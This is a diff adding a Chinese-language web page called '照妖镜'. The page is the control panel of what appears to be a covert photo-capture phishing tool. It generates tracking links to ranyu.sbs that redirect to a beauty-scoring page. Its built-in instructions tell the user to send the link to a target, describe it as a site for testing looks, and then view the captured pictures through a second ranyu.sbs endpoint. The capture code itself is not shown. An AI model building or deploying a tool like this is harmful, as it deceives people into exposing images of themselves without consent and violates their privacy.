@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>照妖镜</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'PingFang SC', 'Helvetica Neue', Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #e8f4ff, #f0f9ff);
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: #333;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: rgba(255, 255, 255, 0.92);
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(90, 181, 251, 0.15);
+            padding: 30px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .container::before {
+            content: "";
+            position: absolute;
+            top: -60px;
+            right: -60px;
+            width: 150px;
+            height: 150px;
+            background: #5ab5fb;
+            border-radius: 50%;
+            opacity: 0.1;
+            z-index: 0;
+        }
+        
+        .container::after {
+            content: "";
+            position: absolute;
+            bottom: -80px;
+            left: -60px;
+            width: 200px;
+            height: 200px;
+            background: #5ab5fb;
+            border-radius: 50%;
+            opacity: 0.08;
+            z-index: 0;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .logo {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 15px;
+            background: linear-gradient(135deg, #5ab5fb, #4da8ff);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 20px rgba(90, 181, 251, 0.3);
+        }
+        
+        .logo span {
+            font-size: 48px;
+            color: white;
+            font-weight: bold;
+        }
+        
+        h1 {
+            font-size: 28px;
+            color: #1a73e8;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        
+        .subtitle {
+            font-size: 15px;
+            color: #666;
+            margin-bottom: 5px;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 15px;
+            color: #555;
+            font-weight: 500;
+        }
+        
+        .form-input {
+            width: 100%;
+            height: 50px;
+            padding: 0 20px;
+            border: 1px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            background: #f9fcff;
+            transition: all 0.3s;
+        }
+        
+        .form-input:focus {
+            border-color: #5ab5fb;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(90, 181, 251, 0.2);
+        }
+        
+        .btn-group {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+        
+        .btn {
+            height: 56px;
+            padding: 0 20px;
+            border: none;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(to right, #5ab5fb, #4da8ff);
+            color: white;
+            box-shadow: 0 4px 15px rgba(90, 181, 251, 0.4);
+            width: 48%;
+        }
+        
+        .btn-primary:hover {
+            background: linear-gradient(to right, #4da8ff, #3b9cff);
+        }
+        
+        .btn-primary:active {
+            transform: translateY(2px);
+            box-shadow: 0 2px 8px rgba(90, 181, 251, 0.4);
+        }
+        
+        .btn-secondary {
+            background: #f0f7ff;
+            color: #5ab5fb;
+            border: 1px solid #c2e0ff;
+            width: 48%;
+        }
+        
+        .btn-secondary:hover {
+            background: #e6f2ff;
+        }
+        
+        .btn-secondary:active {
+            background: #d9eaff;
+        }
+        
+        .btn-tertiary {
+            background: #fff0f0;
+            color: #ff5a5a;
+            border: 1px solid #ffc2c2;
+            width: 100%;
+            margin-top: 15px;
+        }
+        
+        .btn-tertiary:hover {
+            background: #ffe6e6;
+        }
+        
+        .btn-tertiary:active {
+            background: #ffd9d9;
+        }
+        
+        .link-container {
+            background: #f0f9ff;
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 25px;
+            border: 1px dashed #b3e0ff;
+        }
+        
+        .link-label {
+            font-size: 15px;
+            color: #666;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .link-label::before {
+            content: "🔗";
+            margin-right: 8px;
+        }
+        
+        #kd {
+            font-size: 15px;
+            color: #1a73e8;
+            word-break: break-all;
+            display: block;
+            padding: 12px;
+            background: white;
+            border-radius: 8px;
+            border: 1px solid #e0f0ff;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+        
+        #kd:hover {
+            background: #f0f9ff;
+        }
+        
+        .instructions {
+            margin-top: 30px;
+            padding: 20px;
+            background: #f8fbff;
+            border-radius: 15px;
+            border-left: 4px solid #b3e0ff;
+        }
+        
+        .instructions h3 {
+            font-size: 18px;
+            color: #1a73e8;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .instructions h3::before {
+            content: "📌";
+            margin-right: 8px;
+        }
+        
+        .instructions ul {
+            padding-left: 20px;
+        }
+        
+        .instructions li {
+            margin-bottom: 10px;
+            color: #555;
+            line-height: 1.6;
+        }
+        
+        .instructions li::marker {
+            color: #5ab5fb;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 25px 20px;
+                border-radius: 18px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+            
+            .btn {
+                height: 52px;
+                font-size: 16px;
+            }
+            
+            .btn-group {
+                flex-direction: column;
+                gap: 12px;
+            }
+            
+            .btn-primary, .btn-secondary {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <span>🪞</span>
+            </div>
+            <h1>照妖镜</h1>
+        </div>
+        
+        <div class="form-group">
+            <label class="form-label">填写密码</label>
+            <input type="text" class="form-input" id="myid" placeholder="请填写密码" autocomplete="off">
+        </div>
+        
+        <div class="form-group">
+            <label class="form-label">设置跳转地址</label>
+            <input type="text" class="form-input" id="url" value="https://xeva.xiaoice.com/h5/subCommon/beautyV2/main" autocomplete="off">
+        </div>
+        
+        <div class="btn-group">
+            <button class="btn btn-primary" onclick="create()">生成链接</button>
+            <button class="btn btn-secondary" onclick="viewGallery()">查看图片</button>
+        </div>
+        
+        <button class="btn btn-tertiary" onclick="viewHistory()">查看历史密码</button>
+        
+        <div class="link-container">
+            <div class="link-label">生成的链接：</div>
+            <a href="#" id="kd" onclick="copyLink()"></a>
+        </div>
+        
+        <div class="instructions">
+            <h3>使用说明</h3>
+            <ul>
+                <li>填写密码生成链接</li>
+                <li>生成链接后复制并发送给对方</li>
+                <li>告诉对方这是测试颜值的网站</li>
+                <li>对方点击链接后返回页面查看图片</li>
+                <li>历史密码可以查看生成的所有链接</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        // 存储历史记录的数组
+        let historyRecords = [];
+        
+        function checkURL(url) {
+            const urlPattern = /^(https?:\/\/)?([\w-]+\.)+[\w-]+(\/[\w-./?%&=]*)?$/i;
+            return urlPattern.test(url);
+        }
+
+        function create() {
+            const myid = document.getElementById('myid').value;
+            const url = document.getElementById('url').value;
+            const kd = document.getElementById('kd');
+
+            if (!myid || !url) {
+                alert("ID或跳转地址不能为空！");
+                return false;
+            }
+
+            const idPattern = /^[a-zA-Z0-9_-]+$/;
+            if (!idPattern.test(myid)) {
+                alert("ID只能包含字母、数字、- 或 _，请勿输入中文或其他特殊字符！");
+                return false;
+            }
+
+            if (!checkURL(url)) {
+                alert("请输入有效的跳转地址（例如 https://www.example.com）！");
+                return false;
+            }
+
+            const finalUrl = url.startsWith('http://') || url.startsWith('https://') ? url : 'https://' + url;
+            const generatedUrl = 'https://ranyu.sbs/API/zy.php?id=' + encodeURIComponent(myid) + '&url=' + encodeURIComponent(finalUrl);
+            
+            kd.href = generatedUrl;
+            kd.innerText = generatedUrl;
+            
+            // 添加到历史记录
+            const record = {
+                id: myid,
+                url: finalUrl,
+                generatedUrl: generatedUrl,
+                timestamp: new Date().toLocaleString()
+            };
+            historyRecords.push(record);
+            localStorage.setItem('historyRecords', JSON.stringify(historyRecords));
+            
+            copyLink(generatedUrl); // 自动复制链接
+        }
+
+        function copyLink(generatedUrl) {
+            const kd = document.getElementById('kd');
+            const url = generatedUrl || kd.innerText;
+
+            if (navigator.clipboard) {
+                navigator.clipboard.writeText(url).then(() => {
+                    showCopyFeedback();
+                }).catch(() => {
+                    fallbackCopy(url);
+                });
+            } else {
+                fallbackCopy(url);
+            }
+        }
+
+        function fallbackCopy(text) {
+            const textArea = document.createElement('textarea');
+            textArea.value = text;
+            textArea.style.position = 'fixed';
+            textArea.style.opacity = '0';
+            document.body.appendChild(textArea);
+            textArea.focus();
+            textArea.select();
+            
+            try {
+                const successful = document.execCommand('copy');
+                if (successful) {
+                    showCopyFeedback();
+                } else {
+                    alert("复制失败，请手动复制链接！");
+                }
+            } catch (err) {
+                alert("复制失败，请手动复制链接！");
+            } finally {
+                document.body.removeChild(textArea);
+            }
+        }
+
+        function showCopyFeedback() {
+            const kd = document.getElementById('kd');
+            kd.style.backgroundColor = '#e6f7ff';
+            kd.style.borderColor = '#5ab5fb';
+            kd.style.boxShadow = '0 0 0 2px rgba(90, 181, 251, 0.3)';
+            
+            setTimeout(() => {
+                kd.style.backgroundColor = '';
+                kd.style.borderColor = '';
+                kd.style.boxShadow = '';
+            }, 1000);
+            
+            alert("链接已复制到剪贴板！");
+        }
+
+        function viewGallery() {
+            const myid = document.getElementById('myid').value;
+            const idPattern = /^[a-zA-Z0-9_-]+$/;
+            
+            if (!myid) {
+                alert("请先输入ID！");
+                return;
+            }
+            
+            if (!idPattern.test(myid)) {
+                alert("ID只能包含字母、数字、- 或 _，请勿输入中文或其他特殊字符！");
+                return;
+            }
+            
+            window.location.href = 'https://ranyu.sbs/API/ck.php?id=' + encodeURIComponent(myid);
+        }
+        
+        function viewHistory() {
+            // 从本地存储加载历史记录
+            const storedRecords = localStorage.getItem('historyRecords');
+            if (storedRecords) {
+                historyRecords = JSON.parse(storedRecords);
+            }
+            
+            if (historyRecords.length === 0) {
+                alert("暂无历史记录！");
+                return;
+            }
+            
+            let historyText = "历史记录：\n\n";
+            historyRecords.forEach((record, index) => {
+                historyText += `记录 ${index + 1}:\n`;
+                historyText += `ID: ${record.id}\n`;
+                historyText += `跳转地址: ${record.url}\n`;
+                historyText += `生成时间: ${record.timestamp}\n`;
+                historyText += `生成链接: ${record.generatedUrl}\n\n`;
+            });
+            
+            alert(historyText);
+        }
+        
+        // 页面加载时从本地存储加载历史记录
+        window.onload = function() {
+            const storedRecords = localStorage.getItem('historyRecords');
+            if (storedRecords) {
+                historyRecords = JSON.parse(storedRecords);
+            }
+        };
+    </script>
+    <script src="SavePicture.js"></script>
+</body>
+</html>
